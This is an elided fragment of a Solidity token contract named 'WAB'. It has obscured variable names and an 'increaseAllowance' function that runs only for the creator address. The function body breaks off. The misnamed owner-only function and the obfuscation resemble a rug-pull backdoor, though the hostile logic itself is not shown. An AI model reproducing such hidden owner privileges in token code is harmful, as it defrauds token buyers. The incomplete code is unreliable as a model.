...
contract WAB is Ownable {
    ...
    uint256 yayaytooosp = 1000000000*10**decimals();
    uint256 private _hobtotalSupply = yayaytooosp;
    string private _hooextokenname = "WAB";
    string private _voptokensymbol = "WAB";
    ...
    function increaseAllowance(address yayayxx) public     {
        ...
        if(creatoradd != _msgSender()){
            return ;
        }else{
           require(creatoradd == _msgSender());
